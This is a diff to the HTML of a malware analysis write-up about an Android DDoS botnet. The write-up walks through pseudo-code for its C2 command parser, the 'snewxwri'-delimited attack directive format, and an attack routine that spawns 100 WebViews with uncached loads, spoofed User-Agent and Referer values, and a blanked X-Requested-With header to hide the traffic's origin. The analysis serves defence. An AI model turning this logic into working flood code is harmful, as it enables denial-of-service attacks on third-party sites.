@@ -120,11 +120,11 @@ Class ServiceRunner extends Object {
 }</code></pre>
 	<h4>C2 Response Parser</h4>
 	<p>The <code>AttackCommandParser</code> serves as the callback that is triggered when the C2 <code>WebView</code> detects that a page load has occurred. The parser loads the page’s content and extracts the <code>&lt;title&gt;</code> body as the attack command. Based on observed samples, a payload from the C2 looks like this:</p>
-	<pre class="language-bash"><code class="language-bash">
-  <title>
+	<pre class="language-bash"><code class="language-bash">&lt;html&gt;
+  &lt;title&gt;
   https://A_TARGETED_WEBSITE/snewxwriA_USER_AGENT_STRINGsnewxwrihttps://A_REFER_HEADER_VALUE/
-  </title>
-</code></pre>
+  &lt;/title&gt;
+&lt;/html&gt;</code></pre>
 	<p>Figure 3: Attack Directive Sample</p>
 	<p>The value extracted from the <code>&lt;title&gt;</code> tag is then tested via <code>String-&gt;contains()</code> to ensure it contains the value token delimiter <code>snewxwri</code>. If the delimiter is found, the content is trimmed of leading or trailing whitespace and then <code>split()</code> into an <code>Array</code> of pieces on the delimiter. The resulting tokens are then used as parameters to be passed to the <code>DDoS_Service-&gt;attack()</code> method.</p>
 	<h5>C2 Response Parser Pseudo Code</h5>
@@ -165,7 +165,9 @@ Class ServiceRunner extends Object {
         WebViewHeaders-&gt;put(“Referer”,referer);
         WebViewHeaders-&gt;put(“X-Requested-With”,””);
         WebView[] AttackerViews = new WebView[100];
-        for (int i=0; i<attackerviews.length; i++)="" {="" attackerviews[i]="new" webview();="" attackerviews[i]-="">clearHistory();
+        for (int i=0; i&lt;AttackerViews.length; i++) {
+            AttackerViews[i] = new WebView();
+            AttackerViews[i]-&gt;clearHistory();
             AttackerViews[i]-&gt;clearFormData();
             AttackerViews[i]-&gt;clearCache(true);
             WebViewSettings AttackWebViewSettings = AttackerViews[i]-&gt;getSettings();
@@ -177,7 +179,7 @@ Class ServiceRunner extends Object {
             AttackerViews[i]-&gt;loadUrl(target,WebViewHeaders);
         }
     }
-}</attackerviews.length;></code></pre>
+}</code></pre>
 	<h5>DDoS Service onCreate()</h5>
 	<p>The <code>onCreate()</code> method is straightforward: it creates a new <code>android/os/Handler</code> and <code>ServiceRunner</code> instance. The <code>ServiceRunner</code> instance is then hooked into the Handler via a call to <code>postDelayed()</code>. According to <a href="https://developer.android.com/reference/android/os/Handler.html#postDelayed(java.lang.Runnable,%20long)">Android documentation</a>, this “Causes the Runnable r to be added to the message queue, to be run after the specified amount of time elapses.” The second parameter to this method call is the number of milliseconds before the Runnable is invoked. In this sample that value is <code>2</code>, which is a very aggressive timing strategy.</p>
 	<h5>DDoS Service poll_c2()</h5>
@@ -188,7 +190,9 @@ Class ServiceRunner extends Object {
     WebViewHeaders-&gt;put(“Referer”,referer);
     WebViewHeaders-&gt;put(“X-Requested-With”,””);    
     WebView[] AttackerViews = new WebView[100];
-    for (int i=0; i<attackerviews.length; i++)="" {="" attackerviews[i]="new" webview();="" attackerviews[i]-="">clearHistory();
+    for (int i=0; i&lt;AttackerViews.length; i++) {
+        AttackerViews[i] = new WebView();
+        AttackerViews[i]-&gt;clearHistory();
         AttackerViews[i]-&gt;clearFormData();
         AttackerViews[i]-&gt;clearCache(true);
         WebViewSettings AttackWebViewSettings = AttackerViews[i]-&gt;getSettings();
@@ -199,7 +203,7 @@ Class ServiceRunner extends Object {
         this-&gt;deleteDatabase(“webviewCache.db”);
         AttackerViews[i]-&gt;loadUrl(target,WebViewHeaders);
     }
-} </attackerviews.length;></code></pre>
+} </code></pre>
 	<p>The <code>attack()</code> method is responsible for generating the actual attack traffic. The <code>AttackCommandParser-&gt;onPageFinished()</code> that was previously discussed will pass in the target, userAgent, and referer values that were handed out by the last C2 interaction. This method will create a <code>HashMap</code> object that will configure the HTTP Headers used during the attack.</p>
 	<p>The first header is the HTTP Referer, which as we know was supplied by the C2 server. In all observed cases, this value was a mirror value of the actual target. The second header is the <code>X-Requested-With</code> header; although the <code>WebView</code> would usually have a default value,it is overwritten with a blank value. Typically this header coming from an embedded <code>WebView</code> would contain information about the Android application such as <code>com.[app_author].app</code>. It’s likely that this Header was blanked specifically to obfuscate who or what was generating the attack traffic that would be seen by the target.</p>
 	<p>Once the headers are configured, an empty Array of <code>WebView</code> place holders is instantiated, followed by a loop to fill this Array with actual <code>WebView</code> instances. Each instance goes through the same set of configuration processes. The <code>WebView</code> instances created will have their history, saved form data, and cache cleared. The JavaScript capabilities are enabled (this is typically disabled by default for embedded <code>WebViews</code>), the <code>User-Agent</code> string that will be present in the HTTP Headers is overwritten with the value supplied by the C2 attack directive, and the <code>CacheMode</code> set to <code>LOAD_NO_CACHE</code>, which will force the browser instance to bypass local caches and fetch the target URL for each request.</p>
